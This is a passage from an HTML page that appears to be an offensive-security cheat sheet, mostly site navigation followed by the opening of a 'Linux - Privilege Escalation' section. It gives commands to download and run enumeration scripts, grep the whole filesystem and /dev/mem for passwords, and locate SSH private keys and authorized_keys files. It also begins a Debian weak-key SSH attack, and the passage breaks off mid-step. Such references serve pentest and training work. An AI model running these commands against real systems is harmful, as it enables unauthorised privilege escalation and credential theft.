          <span class="md-nav__icon md-icon"></span>
          Upload Insecure Files
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/" class="md-nav__link">
        Upload Insecure Files
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_2" >
      
      
      
        <label class="md-nav__link" for="__nav_41_2" id="__nav_41_2_label" tabindex="0">
          CVE Ffmpeg HLS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_2">
          <span class="md-nav__icon md-icon"></span>
          CVE Ffmpeg HLS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
        FFmpeg HLS vulnerability
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_3" >
      
      
      
        <label class="md-nav__link" for="__nav_41_3" id="__nav_41_3_label" tabindex="0">
          Configuration Apache .htaccess
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_3">
          <span class="md-nav__icon md-icon"></span>
          Configuration Apache .htaccess
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
        .htaccess upload
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_4" >
      
      
      
        <label class="md-nav__link" for="__nav_41_4" id="__nav_41_4_label" tabindex="0">
          Configuration Busybox httpd.conf
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_4">
          <span class="md-nav__icon md-icon"></span>
          Configuration Busybox httpd.conf
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
        Index
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_5" >
      
      
      
        <label class="md-nav__link" for="__nav_41_5" id="__nav_41_5_label" tabindex="0">
          Configuration uwsgi.ini
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_5">
          <span class="md-nav__icon md-icon"></span>
          Configuration uwsgi.ini
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20uwsgi.ini/" class="md-nav__link">
        uWSGI configuration file
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_6" >
      
      
      
        <label class="md-nav__link" for="__nav_41_6" id="__nav_41_6_label" tabindex="0">
          Extension Flash
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_6">
          <span class="md-nav__icon md-icon"></span>
          Extension Flash
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
        Index
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_7" >
      
      
      
        <label class="md-nav__link" for="__nav_41_7" id="__nav_41_7_label" tabindex="0">
          Picture Image Magik
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_7">
          <span class="md-nav__icon md-icon"></span>
          Picture Image Magik
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
        Image Tragik 1 & 2
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_8" >
      
      
      
        <label class="md-nav__link" for="__nav_41_8" id="__nav_41_8_label" tabindex="0">
          Zip Slip
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_8">
          <span class="md-nav__icon md-icon"></span>
          Zip Slip
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
        Zip Slip
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_42" >
      
      
      
        <label class="md-nav__link" for="__nav_42" id="__nav_42_label" tabindex="0">
          Web Cache Deception
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_42_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_42">
          <span class="md-nav__icon md-icon"></span>
          Web Cache Deception
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Web%20Cache%20Deception/" class="md-nav__link">
        Web Cache Deception
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_43" >
      
      
      
        <label class="md-nav__link" for="__nav_43" id="__nav_43_label" tabindex="0">
          Web Sockets
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_43_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_43">
          <span class="md-nav__icon md-icon"></span>
          Web Sockets
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Web%20Sockets/" class="md-nav__link">
        Web Sockets
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_44" >
      
      
      
        <label class="md-nav__link" for="__nav_44" id="__nav_44_label" tabindex="0">
          XPATH Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_44_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_44">
          <span class="md-nav__icon md-icon"></span>
          XPATH Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XPATH%20Injection/" class="md-nav__link">
        XPATH Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_45" >
      
      
      
        <label class="md-nav__link" for="__nav_45" id="__nav_45_label" tabindex="0">
          XSLT Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_45_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_45">
          <span class="md-nav__icon md-icon"></span>
          XSLT Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSLT%20Injection/" class="md-nav__link">
        XSLT Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46" >
      
      
      
        <label class="md-nav__link" for="__nav_46" id="__nav_46_label" tabindex="0">
          XSS Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_46_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_46">
          <span class="md-nav__icon md-icon"></span>
          XSS Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/" class="md-nav__link">
        Cross Site Scripting
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
        XSS in Angular and AngularJS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
        XSS with Relative Path Overwrite - IE 8/9 and lower
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_47" >
      
      
      
        <label class="md-nav__link" for="__nav_47" id="__nav_47_label" tabindex="0">
          XXE Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_47_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_47">
          <span class="md-nav__icon md-icon"></span>
          XXE Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XXE%20Injection/" class="md-nav__link">
        XML External Entity
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48" >
      
      
      
        <label class="md-nav__link" for="__nav_48" id="__nav_48_label" tabindex="0">
           LEARNING AND SOCIALS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_48_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_48">
          <span class="md-nav__icon md-icon"></span>
           LEARNING AND SOCIALS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/BOOKS/" class="md-nav__link">
        Books
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/TWITTER/" class="md-nav__link">
        Twitter
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/YOUTUBE/" class="md-nav__link">
        Youtube
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_49" >
      
      
      
        <label class="md-nav__link" for="__nav_49" id="__nav_49_label" tabindex="0">
           template vuln
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_49_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_49">
          <span class="md-nav__icon md-icon"></span>
           template vuln
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_template_vuln/" class="md-nav__link">
        Vulnerability Title
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="linux-privilege-escalation">Linux - Privilege Escalation</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#tools">Tools</a></li>
<li><a href="#checklists">Checklist</a></li>
<li><a href="#looting-for-passwords">Looting for passwords</a><ul>
<li><a href="#files-containing-passwords">Files containing passwords</a></li>
<li><a href="#old-passwords-in-etcsecurityopasswd">Old passwords in /etc/security/opasswd</a></li>
<li><a href="#last-edited-files">Last edited files</a></li>
<li><a href="#in-memory-passwords">In memory passwords</a></li>
<li><a href="#find-sensitive-files">Find sensitive files</a></li>
</ul>
</li>
<li><a href="#ssh-key">SSH Key</a><ul>
<li><a href="#sensitive-files">Sensitive files</a></li>
<li><a href="#ssh-key-predictable-prng-authorized_keys-process">SSH Key Predictable PRNG (Authorized_Keys) Process</a></li>
</ul>
</li>
<li><a href="#scheduled-tasks">Scheduled tasks</a><ul>
<li><a href="#cron-jobs">Cron jobs</a></li>
<li><a href="#systemd-timers">Systemd timers</a></li>
</ul>
</li>
<li><a href="#suid">SUID</a><ul>
<li><a href="#find-suid-binaries">Find SUID binaries</a></li>
<li><a href="#create-a-suid-binary">Create a SUID binary</a></li>
</ul>
</li>
<li><a href="#capabilities">Capabilities</a><ul>
<li><a href="#list-capabilities-of-binaries">List capabilities of binaries</a></li>
<li><a href="#edit-capabilities">Edit capabilities</a></li>
<li><a href="#interesting-capabilities">Interesting capabilities</a></li>
</ul>
</li>
<li><a href="#sudo">SUDO</a><ul>
<li><a href="#nopasswd">NOPASSWD</a></li>
<li><a href="#ld_preload-and-nopasswd">LD_PRELOAD and NOPASSWD</a></li>
<li><a href="#doas">Doas</a></li>
<li><a href="#sudo_inject">sudo_inject</a></li>
<li><a href="#cve-2019-14287">CVE-2019-14287</a></li>
</ul>
</li>
<li><a href="#gtfobins">GTFOBins</a></li>
<li><a href="#wildcard">Wildcard</a></li>
<li><a href="#writable-files">Writable files</a><ul>
<li><a href="#writable-etcpasswd">Writable /etc/passwd</a></li>
<li><a href="#writable-etcsudoers">Writable /etc/sudoers</a></li>
</ul>
</li>
<li><a href="#nfs-root-squashing">NFS Root Squashing</a></li>
<li><a href="#shared-library">Shared Library</a><ul>
<li><a href="#ldconfig">ldconfig</a></li>
<li><a href="#rpath">RPATH</a></li>
</ul>
</li>
<li><a href="#groups">Groups</a><ul>
<li><a href="#docker">Docker</a></li>
<li><a href="#lxclxd">LXC/LXD</a></li>
</ul>
</li>
<li><a href="#hijack-tmux-session">Hijack TMUX session</a></li>
<li><a href="#kernel-exploits">Kernel Exploits</a><ul>
<li><a href="#cve-2022-0847-dirtypipe">CVE-2022-0847 (DirtyPipe)</a> </li>
<li><a href="#cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></li>
<li><a href="#cve-2010-3904-rds">CVE-2010-3904 (RDS)</a></li>
<li><a href="#cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</a></li>
<li><a href="#cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</a></li>
</ul>
</li>
</ul>
<h2 id="tools">Tools</h2>
<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escalation vectors.
Here are a few:</p>
<ul>
<li>
<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS - Linux Privilege Escalation Awesome Script</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">wget </span><span class="s2">&quot;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&quot;</span> <span class="n">-O</span> <span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">curl </span><span class="s2">&quot;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&quot;</span> <span class="n">-o</span> <span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="p">./</span><span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span> <span class="n">-a</span> <span class="c">#all checks - deeper system enumeration, but it takes longer to complete.</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="p">./</span><span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span> <span class="n">-s</span> <span class="c">#superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">./</span><span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span> <span class="n">-P</span> <span class="c">#Password - Pass a password that will be used with sudo -l and bruteforcing other users</span>
</code></pre></div>
</li>
<li>
<p><a href="https://github.com/diego-treitos/linux-smart-enumeration">LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">wget </span><span class="s2">&quot;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&quot;</span> <span class="n">-O</span> <span class="n">lse</span><span class="p">.</span><span class="n">sh</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nb">curl </span><span class="s2">&quot;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&quot;</span> <span class="n">-o</span> <span class="n">lse</span><span class="p">.</span><span class="n">sh</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="p">./</span><span class="n">lse</span><span class="p">.</span><span class="n">sh</span> <span class="n">-l1</span> <span class="c"># shows interesting information that should help you to privesc</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="p">./</span><span class="n">lse</span><span class="p">.</span><span class="n">sh</span> <span class="n">-l2</span> <span class="c"># dump all the information it gathers about the system</span>
</code></pre></div>
</li>
<li>
<p><a href="https://github.com/rebootuser/LinEnum">LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">./</span><span class="n">LinEnum</span><span class="p">.</span><span class="n">sh</span> <span class="n">-s</span> <span class="n">-k</span> <span class="n">keyword</span> <span class="n">-r</span> <span class="n">report</span> <span class="n">-e</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span> <span class="n">-t</span>
</code></pre></div>
</li>
<li>
<p><a href="https://github.com/AlessandroZ/BeRoot">BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></p>
</li>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py - a Linux Privilege Escalation Check Script</a></li>
<li><a href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</a></li>
<li><a href="https://github.com/TH3xACE/SUDO_KILLER">Privilege Escalation through sudo - Linux</a></li>
</ul>
<h2 id="checklists">Checklists</h2>
<ul>
<li>Kernel and distribution release details</li>
<li>System Information:</li>
<li>Hostname</li>
<li>Networking details:</li>
<li>Current IP</li>
<li>Default route details</li>
<li>DNS server information</li>
<li>User Information:</li>
<li>Current user details</li>
<li>Last logged on users</li>
<li>Shows users logged onto the host</li>
<li>List all users including uid/gid information</li>
<li>List root accounts</li>
<li>Extracts password policies and hash storage method information</li>
<li>Checks umask value</li>
<li>Checks if password hashes are stored in /etc/passwd</li>
<li>Extract full details for 'default' uid's such as 0, 1000, 1001 etc</li>
<li>Attempt to read restricted files i.e. /etc/shadow</li>
<li>List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</li>
<li>Basic SSH checks</li>
<li>Privileged access:</li>
<li>Which users have recently used sudo</li>
<li>Determine if /etc/sudoers is accessible</li>
<li>Determine if the current user has Sudo access without a password</li>
<li>Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)</li>
<li>Is root's home directory accessible</li>
<li>List permissions for /home/</li>
<li>Environmental:</li>
<li>Display current $PATH</li>
<li>Displays env information</li>
<li>Jobs/Tasks:</li>
<li>List all cron jobs</li>
<li>Locate all world-writable cron jobs</li>
<li>Locate cron jobs owned by other users of the system</li>
<li>List the active and inactive systemd timers</li>
<li>Services:</li>
<li>List network connections (TCP &amp; UDP)</li>
<li>List running processes</li>
<li>Lookup and list process binaries and associated permissions</li>
<li>List inetd.conf/xined.conf contents and associated binary file permissions</li>
<li>List init.d binary permissions</li>
<li>Version Information (of the following):</li>
<li>Sudo</li>
<li>MYSQL</li>
<li>Postgres</li>
<li>Apache<ul>
<li>Checks user config</li>
<li>Shows enabled modules</li>
<li>Checks for htpasswd files</li>
<li>View www directories</li>
</ul>
</li>
<li>Default/Weak Credentials:</li>
<li>Checks for default/weak Postgres accounts</li>
<li>Checks for default/weak MYSQL accounts</li>
<li>Searches:</li>
<li>Locate all SUID/GUID files</li>
<li>Locate all world-writable SUID/GUID files</li>
<li>Locate all SUID/GUID files owned by root</li>
<li>Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)</li>
<li>Locate files with POSIX capabilities</li>
<li>List all world-writable files</li>
<li>Find/list all accessible *.plan files and display contents</li>
<li>Find/list all accessible *.rhosts files and display contents</li>
<li>Show NFS server details</li>
<li>Locate <em>.conf and </em>.log files containing keyword supplied at script runtime</li>
<li>List all *.conf files located in /etc</li>
<li>Locate mail</li>
<li>Platform/software specific tests:</li>
<li>Checks to determine if we're in a Docker container</li>
<li>Checks to see if the host has Docker installed</li>
<li>Checks to determine if we're in an LXC container</li>
</ul>
<h2 id="looting-for-passwords">Looting for passwords</h2>
<h3 id="files-containing-passwords">Files containing passwords</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">grep</span> <span class="p">-</span><span class="n">-color</span><span class="p">=</span><span class="n">auto</span> <span class="n">-rnw</span> <span class="s1">&#39;/&#39;</span> <span class="n">-ie</span> <span class="s2">&quot;PASSWORD&quot;</span> <span class="p">-</span><span class="n">-color</span><span class="p">=</span><span class="n">always</span> <span class="n">2</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">find</span> <span class="p">.</span> <span class="n">-type</span> <span class="n">f</span> <span class="n">-exec</span> <span class="n">grep</span> <span class="n">-i</span> <span class="n">-I</span> <span class="s2">&quot;PASSWORD&quot;</span> <span class="p">{}</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span> <span class="p">\;</span>
</code></pre></div>
<h3 id="old-passwords-in-etcsecurityopasswd">Old passwords in /etc/security/opasswd</h3>
<p>The <code>/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p>
<p><img alt="" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes </p>
<h3 id="last-edited-files">Last edited files</h3>
<p>Files that were edited in the last 10 minutes</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">find</span> <span class="p">/</span> <span class="n">-mmin</span> <span class="p">-</span><span class="n">10</span> <span class="n">2</span><span class="p">&gt;/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-Ev</span> <span class="s2">&quot;^/proc&quot;</span>
</code></pre></div>
<h3 id="in-memory-passwords">In memory passwords</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">strings</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">mem</span> <span class="n">-n10</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-i</span> <span class="n">PASS</span>
</code></pre></div>
<h3 id="find-sensitive-files">Find sensitive files</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">$</span> <span class="n">locate</span> <span class="n">password</span> <span class="p">|</span> <span class="n">more</span>           
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="p">/</span><span class="n">boot</span><span class="p">/</span><span class="n">grub</span><span class="p">/</span><span class="n">i386-pc</span><span class="p">/</span><span class="n">password</span><span class="p">.</span><span class="n">mod</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="p">/</span><span class="n">common-password</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="p">/</span><span class="n">gdm-password</span>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="p">/</span><span class="n">gdm-password</span><span class="p">.</span><span class="n">original</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">live</span><span class="p">/</span><span class="n">config</span><span class="p">/</span><span class="n">0031-root-password</span>
<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="p">...</span>
</code></pre></div>
<h2 id="ssh-key">SSH Key</h2>
<h3 id="sensitive-files">Sensitive files</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>find / -name authorized_keys 2&gt; /dev/null
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>find / -name id_rsa 2&gt; /dev/null
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>...
</code></pre></div>
<h3 id="ssh-key-predictable-prng-authorized_keys-process">SSH Key Predictable PRNG (Authorized_Keys) Process</h3>
<p>This module describes how to attempt to use an obtained authorized_keys file on a host system.</p>
<p>Needed : SSH-DSS String from authorized_keys file</p>
<p><strong>Steps</strong></p>
<ol>
<li>Get the authorized_keys file. An example of this file would look like so:</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
</code></pre></div>
<ol>
<li>Since this is an ssh-dss key, we need to add that to our local copy of <code>/etc/ssh/ssh_config</code> and <code>/etc/ssh/sshd_config</code>:</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>echo &quot;PubkeyAcceptedKeyTypes=+ssh-dss&quot; &gt;&gt; /etc/ssh/ssh_config
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>echo &quot;PubkeyAcceptedKeyTypes=+ssh-dss&quot; &gt;&gt; /etc/ssh/sshd_config
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>/etc/init.d/ssh restart
</code></pre></div>
<ol>
<li>Get <a href="https://github.com/g0tmi1k/debian-ssh">g0tmi1k's debian-ssh repository</a> and unpack the keys:</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>git clone https://github.com/g0tmi1k/debian-ssh
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>cd debian-ssh
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
</code></pre></div>
<ol>
<li>Grab the first 20 or 30 bytes from the key file shown above starting with the <code>"AAAA..."</code> portion and grep the unpacked keys with it as:</li>
</ol>
